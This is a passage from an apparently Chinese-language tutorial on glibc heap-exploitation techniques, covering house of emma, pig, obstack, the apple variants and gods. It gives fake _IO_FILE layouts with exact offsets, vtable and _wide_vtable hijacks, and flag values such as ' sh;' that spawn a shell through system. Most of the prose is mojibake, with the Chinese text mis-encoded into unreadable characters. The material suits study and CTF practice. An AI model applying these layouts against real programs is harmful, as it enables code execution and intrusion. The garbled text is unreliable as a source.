assertion failure in %s: %s\n",   function, assertion);  __builtin_unreachable (); }</code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>è€Œåœ¨ <code>2.37</code> è¯¥å‡½æ•°ç›´æ¥è¢«åˆ æ‰äº†ã€‚</p><ul><li><p>å¦‚æœ <code>stderr</code> åœ¨ <code>libc</code> ä¸Šï¼Œéœ€è¦ä¿®æ”¹è°ƒ <code>stderr</code> å¤„çš„æŒ‡é’ˆï¼Œä¹Ÿæœ‰å¯èƒ½åœ¨ç¨‹åºçš„åœ°å€ç©ºé—´ä¸Š</p></li><li><p>ä¼ªé€ çš„æŠ€å·§å¦‚ä¸‹ï¼Œè§¦å‘ <code>fxprintf(stderrï¼Œ......)</code>ï¼š</p><p>| <code>1 2 3 4 5 </code> | <code>flags &amp; 0x8000çš„è¯ï¼Œä¸ç”¨ä¼ªé€ _lock flags &amp; ~(0x2 | 0x8) å¿…é¡»æˆç«‹ï¼Œé¿å…èµ°åˆ°unbufferedçš„æµç¨‹ mode è®¾ç½®ä¸º0 vtableé»˜è®¤è°ƒç”¨çš„æ˜¯åç§»0x38çš„å‡½æ•°ï¼Œå¦‚æœæƒ³åŠ«æŒä¸º_IO_xxx_overflowï¼Œéœ€è¦è®¾ç½®ä¸º_IO_xxx_jumps-0x20 flags å¯ä»¥è®¾ç½®ä¸º"  sh||"ï¼Œå‰é¢æœ‰ä¸¤ä¸ªç©ºæ ¼ï¼Œæ­¤æ—¶è¿˜éœ€è¦è®¾ç½®_lockï¼Œä¸æƒ³è®¾ç½®_lockçš„æ—¶å€™ï¼Œflagså¯ä»¥ä¸º"\x20\x80;sh||"</code> |<br>| â€”â€”â€”â€” | â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” |<br>|              |                                                              |</p></li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-19"><a href="#åˆ©ç”¨æ•ˆæœ-19" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>è§¦å‘ <code>IO</code> å¤„ç†æµç¨‹ï¼Œä¸ºåç»­åˆ©ç”¨åšå‡†å¤‡</li></ul><h2 id="2-22-house-of-emma"><a href="#2-22-house-of-emma" class="headerlink" title="2.22-house of emma"></a>2.22-house of emma</h2><h3 id="æ¼æ´æˆå› -21"><a href="#æ¼æ´æˆå› -21" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-21"><a href="#é€‚ç”¨èŒƒå›´-21" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>å¯ä»¥è¿›è¡Œä¸¤æ¬¡ <code>largebin attack</code></li><li>æˆ–è€…å¯ä»¥è¿›è¡Œä¸¤æ¬¡ä»»æ„åœ°å€å†™å †åœ°å€</li><li>å¯ä»¥è§¦å‘ <code>IO</code> æµæ“ä½œ</li></ul><h3 id="åˆ©ç”¨åŸç†-21"><a href="#åˆ©ç”¨åŸç†-21" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>åœ¨<code>_IO_cookie_jumps</code> ä¸­å­˜åœ¨ä¸€äº›<code>_IO_cookie_read</code> ç­‰å‡½æ•°ï¼Œå¦‚ä¸‹ï¼š</p><p>å¯ä»¥çœ‹åˆ°æœ‰å‡½æ•°æŒ‡é’ˆçš„è°ƒç”¨ã€‚ä½†æ˜¯å¯¹å‡½æ•°æŒ‡é’ˆä½¿ç”¨ <code>pointer_guard</code> è¿›è¡Œäº†åŠ å¯†ï¼š</p><p>å¾ªç¯å³ç§»åï¼Œå†å¼‚æˆ–ã€‚</p><p>å› æ­¤ï¼Œåˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li>æˆªè‡³æŸä¸ª <code>IO_FILE</code> çš„æŒ‡é’ˆï¼ˆ<code>IO_list_all/stdxxx-&gt;chain</code> ç­‰éƒ½å¯ä»¥ï¼‰ä¸ºå †åœ°å€</li><li>å †ä¸Šä¼ªé€  <code>IO_FILE</code> ç»“æ„ï¼Œå…¶ <code>vtable</code> æ›¿æ¢ä¸º<code>_IO_cookie_jumps+XX</code>ï¼Œ<code>XX</code> ä¸ºä¸€ä¸ªåç§»é‡</li><li>ä¼ªé€ å¥½å‡½æ•°æŒ‡é’ˆå’Œè°ƒç”¨å‚æ•°ï¼ŒæŒ‡é’ˆéœ€è¦å¾ªç¯å¼‚æˆ–å’ŒåŠ å¯†</li><li>è°ƒç”¨åˆ°<code>_IO_cookie_read</code> ç­‰å‡½æ•°ï¼Œè¿›è€Œæ‰§è¡Œä»»æ„å‡½æ•°</li></ul><h3 id="ç›¸å…³æŠ€å·§-21"><a href="#ç›¸å…³æŠ€å·§-21" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>å¸¸ç”¨çš„ <code>gadget</code> æœ‰ï¼š</li><li><code>pointer_guard</code> å°±åœ¨ <code>canary</code> ä¸‹é¢ï¼Œåç§»å¯èƒ½éœ€è¦çˆ†ç ´</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-20"><a href="#åˆ©ç”¨æ•ˆæœ-20" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„å‡½æ•°æ‰§è¡Œ</li></ul><h2 id="2-23-house-of-pig"><a href="#2-23-house-of-pig" class="headerlink" title="2.23-house of pig"></a>2.23-house of pig</h2><h3 id="æ¼æ´æˆå› -22"><a href="#æ¼æ´æˆå› -22" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-22"><a href="#é€‚ç”¨èŒƒå›´-22" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>å¯ä»¥è¿›è¡Œ <code>largebin attack</code></li><li>å¯ä»¥è§¦å‘ <code>IO</code> æµæ“ä½œ</li></ul><h3 id="åˆ©ç”¨åŸç†-22"><a href="#åˆ©ç”¨åŸç†-22" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>åœ¨<code>_IO_str_jumps</code> ä¸­ï¼Œå­˜åœ¨ç€<code>_IO_str_overflow</code> å‡½æ•°ï¼š</p><p>ä»å‡½æ•°ä¸­å°±èƒ½çœ‹åˆ°ï¼Œåˆ©ç”¨æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ä¼ªé€  <code>IO_FILE</code> çš„<code>_IO_buf_base</code></li><li>åˆç†æ§åˆ¶<code>_IO_buf_end-_IO_buf_base</code> çš„å€¼ï¼Œè¿›è€Œæ§åˆ¶åˆ†é…çš„ <code>chunk</code> çš„å¤§å°ï¼Œåˆ†é…åˆ°å¸ƒå±€å¥½çš„åœ°å€</li><li>åœ¨ <code>memcpy</code> ä¸­è¦†ç›–åœ°å€ï¼Œå¦‚å¯ä»¥è¦†ç›–<code>__malloc_hook/__free_hook</code> ç­‰</li></ul><p>è¯¥æ–¹æ³•éœ€è¦ç»“åˆå…¶ä»–å †åˆ©ç”¨æŠ€æœ¯ï¼Œéœ€è¦ä¿è¯ <code>malloc</code> åˆ†é…å‡ºæ¥çš„ <code>chunk</code> çš„åœ°å€æ˜¯å¯æ§çš„ã€‚è¯¥æ–¹æ³•ä¸»è¦æä¾›äº†å¯¹ <code>IO</code> ç³»åˆ—å‡½æ•°ä¸­é—´æ¥è°ƒç”¨ <code>mallc/free/memcpy</code> çš„ç»„åˆåˆ©ç”¨ã€‚</p><h3 id="ç›¸å…³æŠ€å·§-22"><a href="#ç›¸å…³æŠ€å·§-22" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>å¯ä»¥ <code>largebin attack</code> æ‰“æ‰ <code>mp_.tcachebins</code>ï¼Œè¿›è€Œèƒ½æŠŠå¾ˆå¤§çš„ <code>chunk</code> ä¹Ÿæ”¾è¿›å…¥ <code>tcache</code> è¿›è¡Œç®¡ç†</li><li>é«˜ç‰ˆæœ¬æ²¡æœ‰ <code>hook</code> çš„è¯ï¼Œå¯ä»¥åˆ©ç”¨ <code>memcpy@got</code>ï¼Œé€šè¿‡è¦†å†™ <code>got</code> æ¥è¿›è¡Œ <code>rce</code></li><li>å¯ä»¥å¤šæ¬¡ <code>house of pig</code> ç»„åˆè°ƒç”¨</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-21"><a href="#åˆ©ç”¨æ•ˆæœ-21" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„å‡½æ•°æ‰§è¡Œ</li><li><code>ROP</code> æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ</li></ul><h2 id="2-24-house-of-obstack"><a href="#2-24-house-of-obstack" class="headerlink" title="2.24-house of obstack"></a>2.24-house of obstack</h2><h3 id="æ¼æ´æˆå› -23"><a href="#æ¼æ´æˆå› -23" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-23"><a href="#é€‚ç”¨èŒƒå›´-23" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>å¯ä»¥æ‰§è¡Œä¸€æ¬¡ <code>largebin attack</code></li><li>å¯ä»¥è§¦å‘ <code>IO</code> æµæ“ä½œ</li></ul><h3 id="åˆ©ç”¨åŸç†-23"><a href="#åˆ©ç”¨åŸç†-23" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>ä¸€æ¡æ–°çš„åˆ©ç”¨é“¾ï¼Œä¼ªé€  <code>vtable</code> ä¸º<code>_IO_obstack_jumps</code>ï¼Œç„¶åè°ƒç”¨åˆ°<code>_IO_obstack_xsputn</code>ï¼Œç´§æ¥ç€è°ƒç”¨ <code>obstack_grow</code>ï¼Œå…¶ä»£ç ä¸ºï¼š</p><table><thead><tr><th><code>1 2 3 4 5 6 7 8 9 </code></th><th><code>#define obstack_grow(OBSTACK, where, length)                      \  __extension__                                   \    ({ struct obstack *__o = (OBSTACK);                       \       int __len = (length);                              \       if (_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)                  \     _obstack_newchunk (__o, __len);                      \       memcpy (__o-&gt;next_free, where, __len);                     \       __o-&gt;next_free += __len;                           \       (void) 0; })</code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>ç„¶ååœ¨<code>_obstack_newchunk</code> è°ƒç”¨äº† <code>CALL_CHUNKFUN</code> è¿™ä¸ªå®</p><p>è¿™ä¸ªå®ä¼šè°ƒç”¨åˆ°å‡½æ•°æŒ‡é’ˆï¼š</p><table><thead><tr><th><code>1 2 3 4 </code></th><th><code># define CALL_CHUNKFUN(h, size) \  (((h)-&gt;use_extra_arg)                               \   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))                     \   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>å› æ­¤ï¼Œå…¶å°±æ˜¯åˆ©ç”¨è¯¥å‡½æ•°æŒ‡é’ˆè¿›è¡Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµã€‚</p><h3 id="ç›¸å…³æŠ€å·§-23"><a href="#ç›¸å…³æŠ€å·§-23" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><p>ä¼ªé€ çš„ <code>IO_FILE</code> å¸ƒå±€å¦‚ä¸‹ï¼š</p><ul><li>åˆ©ç”¨ <code>largebin attack</code> ä¼ªé€ <code>_IO_FILE</code>ï¼Œè®°å®Œæˆä¼ªé€ çš„ <code>chunk</code> ä¸º <code>A</code>ï¼ˆæˆ–è€…åˆ«çš„æ‰‹æ³•ï¼‰</li><li><code>chunk A</code> å†…åç§»ä¸º <code>0xd8</code> å¤„è®¾ä¸º<code>_IO_obstack_jumps+0x20</code></li><li><code>chunk A</code> å†…åç§»ä¸º <code>0xe0</code> å¤„è®¾ç½® <code>chunk A</code> çš„åœ°å€ä½œä¸º <code>obstack</code> ç»“æ„ä½“</li><li><code>chunk A</code> å†…åç§»ä¸º <code>0x18</code> å¤„è®¾ä¸º <code>1</code>ï¼ˆ<code>next_free</code>)</li><li><code>chunk A</code> å†…åç§»ä¸º <code>0x20</code> å¤„è®¾ä¸º <code>0</code>ï¼ˆ<code>chunk_limit</code>ï¼‰</li><li><code>chunk A</code> å†…åç§»ä¸º <code>0x48</code> å¤„è®¾ä¸º <code>&amp;/bin/sh</code></li><li><code>chunk A</code> å†…åç§»ä¸º <code>0x38</code> å¤„è®¾ä¸º <code>system</code> å‡½æ•°çš„åœ°å€</li><li><code>chunk A</code> å†…åç§»ä¸º <code>0x28</code> å¤„è®¾ä¸º <code>1</code>ï¼ˆ<code>_IO_write_ptr</code>)</li><li><code>chunk A</code> å†…åç§»ä¸º <code>0x30</code> å¤„è®¾ä¸º <code>0</code> (<code>_IO_write_end</code>)</li><li><code>chunk A</code> å†…åç§»ä¸º <code>0x50</code> å¤„è®¾ä¸º <code>1</code> (<code>use_extra_arg</code>)</li></ul><p><code>glibc-2.37</code> å¼€å§‹è¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨é“¾ä¸ºï¼š<code>__printf_buffer_as_file_overflow -&gt; __printf_buffer_flush -&gt; __printf_buffer_flush_obstack-&gt;__obstack_newchunk</code>ã€‚</p><h3 id="åˆ©ç”¨æ•ˆæœ-22"><a href="#åˆ©ç”¨æ•ˆæœ-22" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„å‡½æ•°æ‰§è¡Œ</li></ul><h2 id="2-25-house-of-apple1"><a href="#2-25-house-of-apple1" class="headerlink" title="2.25-house of apple1"></a>2.25-house of apple1</h2><h3 id="æ¼æ´æˆå› -24"><a href="#æ¼æ´æˆå› -24" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-24"><a href="#é€‚ç”¨èŒƒå›´-24" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>ç¨‹åºä» <code>main</code> å‡½æ•°è¿”å›æˆ–èƒ½è°ƒç”¨ <code>exit</code> å‡½æ•°</li><li>èƒ½æ³„éœ²å‡º <code>heap</code> åœ°å€å’Œ <code>libc</code> åœ°å€</li><li>èƒ½ä½¿ç”¨ä¸€æ¬¡ <code>largebin attack</code>ï¼ˆä¸€æ¬¡å³å¯ï¼‰</li></ul><h3 id="åˆ©ç”¨åŸç†-24"><a href="#åˆ©ç”¨åŸç†-24" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>åˆ©ç”¨<code>_IO_wstr_overflow</code> å°†ä»»æ„åœ°å€å­˜å‚¨çš„å€¼ä¿®æ”¹å·²çŸ¥å€¼ï¼š</p><p>æ¯”å¦‚ä¿®æ”¹ <code>tcache</code> å˜é‡ã€<code>mp_</code>ç»“æ„ä½“ã€<code>pointer_guard</code> å˜é‡ç­‰ã€‚</p><p>ä¿®æ”¹æˆåŠŸåï¼Œå†ä½¿ç”¨å…¶ä»–æŠ€æœ¯æ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚</p><h3 id="ç›¸å…³æŠ€å·§-24"><a href="#ç›¸å…³æŠ€å·§-24" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><p><code>house of apple1</code> æ˜¯å¯¹ç°æœ‰ä¸€äº› <code>IO</code> æµæ”»å‡»æ–¹æ³•çš„è¡¥å……ï¼Œèƒ½åœ¨ä¸€æ¬¡åŠ«æŒ <code>IO</code> æµçš„è¿‡ç¨‹ä¸­åšåˆ°ä»»æ„åœ°å€å†™å·²çŸ¥å€¼ï¼Œè¿›è€Œæ„é€ å‡ºå…¶ä»–æ–¹æ³•æ”»å‡»æˆåŠŸçš„æ¡ä»¶ã€‚</p><h3 id="åˆ©ç”¨æ•ˆæœ-23"><a href="#åˆ©ç”¨æ•ˆæœ-23" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„åœ°å€å†™å·²çŸ¥å †åœ°å€</li></ul><h2 id="2-26-house-of-apple2"><a href="#2-26-house-of-apple2" class="headerlink" title="2.26-house of apple2"></a>2.26-house of apple2</h2><h3 id="æ¼æ´æˆå› -25"><a href="#æ¼æ´æˆå› -25" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-25"><a href="#é€‚ç”¨èŒƒå›´-25" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>å·²çŸ¥ <code>heap</code> åœ°å€å’Œ <code>glibc</code> åœ°å€</li><li>èƒ½æ§åˆ¶ç¨‹åºæ‰§è¡Œ <code>IO</code> æ“ä½œï¼ŒåŒ…æ‹¬ä½†ä¸é™äºï¼šä» <code>main</code> å‡½æ•°è¿”å›ã€è°ƒç”¨ <code>exit</code> å‡½æ•°ã€é€šè¿‡<code>__malloc_assert</code> è§¦å‘</li><li>èƒ½æ§åˆ¶<code>_IO_FILE</code> çš„ <code>vtable</code> å’Œ<code>_wide_data</code>ï¼Œä¸€èˆ¬ä½¿ç”¨ <code>largebin attack</code> å»æ§åˆ¶</li></ul><h3 id="åˆ©ç”¨åŸç†-25"><a href="#åˆ©ç”¨åŸç†-25" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p><code>_IO_WIDE_JUMPS</code> æ²¡æœ‰æ£€æŸ¥<code>_wide_vtable</code> çš„åˆæ³•æ€§ï¼š</p><table><thead><tr><th><code>1 2 3 4 5 6 7 8 </code></th><th><code>#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH) #define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1) #define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS) #define _IO_WIDE_JUMPS(THIS) \  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>æ‰€ä»¥åˆ©ç”¨<code>_IO_wfile_jumps</code> ç­‰ä¼ªé€ <code>_wide_vtable</code> å³å¯ã€‚</p><h3 id="ç›¸å…³æŠ€å·§-25"><a href="#ç›¸å…³æŠ€å·§-25" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><p>åˆ©ç”¨<code>_IO_wfile_overflow</code> å‡½æ•°æ§åˆ¶ç¨‹åºæ‰§è¡Œæµæ—¶å¯¹ <code>fp</code> çš„è®¾ç½®å¦‚ä¸‹ï¼š</p><ul><li><code>_flags</code> è®¾ç½®ä¸º <code>~(2 | 0x8 | 0x800)</code>ï¼Œå¦‚æœä¸éœ€è¦æ§åˆ¶ <code>rdi</code>ï¼Œè®¾ç½®ä¸º <code>0</code> å³å¯ï¼›å¦‚æœéœ€è¦è·å¾— <code>shell</code>ï¼Œå¯è®¾ç½®ä¸º<code> sh;</code>ï¼Œæ³¨æ„å‰é¢æœ‰ä¸¤ä¸ªç©ºæ ¼</li><li><code>vtable</code> è®¾ç½®ä¸º<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code> åœ°å€ï¼ˆåŠ å‡åç§»ï¼‰ï¼Œä½¿å…¶èƒ½æˆåŠŸè°ƒç”¨<code>_IO_wfile_overflow</code> å³å¯</li><li><code>_wide_data</code> è®¾ç½®ä¸ºå¯æ§å †åœ°å€ <code>A</code>ï¼Œå³æ»¡è¶³ <code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_base</code> è®¾ç½®ä¸º <code>0</code>ï¼Œå³æ»¡è¶³ <code>*(A + 0x18) = 0</code></li><li><code>_wide_data-&gt;_IO_buf_base</code> è®¾ç½®ä¸º <code>0</code>ï¼Œå³æ»¡è¶³ <code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code> è®¾ç½®ä¸ºå¯æ§å †åœ°å€ <code>B</code>ï¼Œå³æ»¡è¶³ <code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> è®¾ç½®ä¸ºåœ°å€ <code>C</code> ç”¨äºåŠ«æŒ <code>RIP</code>ï¼Œå³æ»¡è¶³ <code>*(B + 0x68) = C</code></li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-24"><a href="#åˆ©ç”¨æ•ˆæœ-24" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„å‡½æ•°æ‰§è¡Œ</li></ul><h2 id="2-27-house-of-apple3"><a href="#2-27-house-of-apple3" class="headerlink" title="2.27-house of apple3"></a>2.27-house of apple3</h2><h3 id="æ¼æ´æˆå› -26"><a href="#æ¼æ´æˆå› -26" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-26"><a href="#é€‚ç”¨èŒƒå›´-26" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>å·²çŸ¥ <code>heap</code> åœ°å€å’Œ <code>glibc</code> åœ°å€</li><li>èƒ½æ§åˆ¶ç¨‹åºæ‰§è¡Œ <code>IO</code> æ“ä½œï¼ŒåŒ…æ‹¬ä½†ä¸é™äºï¼šä» <code>main</code> å‡½æ•°è¿”å›ã€è°ƒç”¨ <code>exit</code> å‡½æ•°ã€é€šè¿‡<code>__malloc_assert</code> è§¦å‘</li><li>èƒ½æ§åˆ¶<code>_IO_FILE</code> çš„ <code>vtable</code> å’Œ<code>_wide_data</code>ï¼Œä¸€èˆ¬ä½¿ç”¨ <code>largebin attack</code> å»æ§åˆ¶</li></ul><h3 id="åˆ©ç”¨åŸç†-26"><a href="#åˆ©ç”¨åŸç†-26" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p><code>__libio_codecvt_in</code> ç­‰å‡½æ•°ï¼Œå¯ä»¥è®¾ç½® <code>gs-&gt;__shlib_handle == NULL</code> ç»•è¿‡ <code>PTR_DEMANGLE</code> å¯¹æŒ‡é’ˆçš„ä¿æŠ¤ï¼Œç„¶åé€šè¿‡<code>_IO_wfile_underflow </code>è°ƒç”¨åˆ°<code>__libio_codecvt_in</code> æ¥æ§åˆ¶å‡½æ•°æŒ‡é’ˆï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h3 id="ç›¸å…³æŠ€å·§-26"><a href="#ç›¸å…³æŠ€å·§-26" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><p>åˆ©ç”¨_IO_wfile_underflow å‡½æ•°æ§åˆ¶ç¨‹åºæ‰§è¡Œæµæ—¶å¯¹ <code>fp</code> çš„è®¾ç½®å¦‚ä¸‹ï¼š</p><ul><li><code>_flags</code> è®¾ç½®ä¸º <code>~(4 | 0x10)</code></li><li><code>vtable</code> è®¾ç½®ä¸º<code>_IO_wfile_jumps</code> åœ°å€ï¼ˆåŠ å‡åç§»ï¼‰ï¼Œä½¿å…¶èƒ½æˆåŠŸè°ƒç”¨<code>_IO_wfile_underflow</code> å³å¯</li><li><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>ï¼Œå³æ»¡è¶³ <code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code> ä¿æŒé»˜è®¤ï¼Œæˆ–è€…è®¾ç½®ä¸ºå †åœ°å€ï¼Œå‡è®¾å…¶åœ°å€ä¸º <code>A</code>ï¼Œå³æ»¡è¶³ <code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>ï¼Œå³æ»¡è¶³ <code>*A &gt;= *(A + 8)</code></li><li><code>_codecvt</code> è®¾ç½®ä¸ºå¯æ§å †åœ°å€ <code>B</code>ï¼Œå³æ»¡è¶³ <code>*(fp + 0x98) = B</code></li><li><code>codecvt-&gt;__cd_in.step</code> è®¾ç½®ä¸ºå¯æ§å †åœ°å€ <code>C</code>ï¼Œå³æ»¡è¶³ <code>*B = C</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code> è®¾ç½®ä¸º <code>0</code>ï¼Œå³æ»¡è¶³ <code>*C = 0</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code> è®¾ç½®ä¸ºåœ°å€ <code>D</code>, åœ°å€ <code>D</code> ç”¨äºæ§åˆ¶ <code>rip</code>ï¼Œå³æ»¡è¶³ <code>*(C + 0x28) = D</code>ã€‚å½“è°ƒç”¨åˆ° <code>D</code> çš„æ—¶å€™ï¼Œæ­¤æ—¶çš„ <code>rdi</code> ä¸º <code>C</code>ã€‚å¦‚æœ<code>_wide_data</code> ä¹Ÿå¯æ§çš„è¯ï¼Œ<code>rsi</code> ä¹Ÿèƒ½æ§åˆ¶ã€‚</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-25"><a href="#åˆ©ç”¨æ•ˆæœ-25" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„å‡½æ•°æ‰§è¡Œ</li></ul><h2 id="2-28-house-of-gods"><a href="#2-28-house-of-gods" class="headerlink" title="2.28-house of gods"></a>2.28-house of gods</h2><h3 id="æ¼æ´æˆå› -27"><a href="#æ¼æ´æˆå› -27" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-27"><a href="#é€‚ç”¨èŒƒå›´-27" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€”<code>2.27</code></li><li>æ³„éœ²å †åœ°å€å’Œ <code>libc</code> åœ°å€</li><li>ä»»æ„å¤§å°åˆ†é…</li></ul><h3 id="åˆ©ç”¨åŸç†-27"><a href="#åˆ©ç”¨åŸç†-27" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>è¿™ä¸ªæŠ€å·§æ¯”è¾ƒæœ‰æ„æ€ï¼Œéå¸¸å»ºè®®æŠŠä½œè€…çš„åŸåšå®¢è¯»ä¸€ä¸‹ã€‚æˆ‘ä¼šç®€è¿°ä¸€ä¸‹è¯¥æŠ€å·§çš„åˆ©ç”¨è¿‡ç¨‹ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œè¯¥æŠ€å·§æœ€ç»ˆçš„ç›®çš„æ˜¯ä¼ªé€ ä¸€ä¸ª <code>fake arena</code>ï¼Œé€šè¿‡åŠ«æŒ <code>main_arena.next</code> å­—æ®µå®Œæˆã€‚</p><p>å…¶ä¸»è¦è¿‡ç¨‹ä¸ºï¼š</p><ul><li>é€šè¿‡ <code>binmap</code> çš„èµ‹å€¼ï¼Œå°†å…¶å½“åš <code>chunk</code> çš„ <code>size</code>ï¼Œç„¶åä¿®æ”¹ <code>unsortedbin</code> é“¾çš„ <code>bk</code> æŒ‡å‘ <code>binmap</code>ï¼Œä½œè€…é€‰æ‹©çš„æ˜¯ <code>0x90</code> å¤§å°çš„ <code>chunk</code>ï¼Œé‡Šæ”¾åæ°å¥½è®© <code>binmap</code> ç§°ä¸º <code>0x200</code>ï¼Œç„¶å <code>binmap-&gt;bk</code> æ˜¯ <code>main_arena</code>(åˆå§‹çŠ¶æ€ä¸‹ <code>main_arena.next = &amp;main_arena</code>)ï¼Œç„¶å <code>main_arena-&gt;bk= fastbin[0x40]</code></li><li>åˆ†é… <code>0x1f0</code> å¤§å°çš„ <code>chunk</code> å°±åˆšå¥½èƒ½åˆ†é…åˆ° <code>binmap</code></li><li>ä¹‹åä¿®æ”¹æ‰ <code>main_arena</code> çš„ <code>system_mem</code> ä¸ºå¾ˆå¤§çš„å€¼å’Œ <code>next</code> æŒ‡å‘ <code>fake arena</code></li><li>ç„¶åç”¨ <code>unsortedbin attack</code> æ‰“æ‰ <code>narenas</code>ï¼Œå°†å…¶æ”¹ä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°</li><li>ç„¶ååˆ†é…ä¸¤æ¬¡ <code>malloc(0xffffffffffffffbf + 1)</code>ï¼Œè§¦å‘ <code>arena_get_retry</code>ï¼Œè¿›è€Œè§¦å‘ä¸¤æ¬¡ 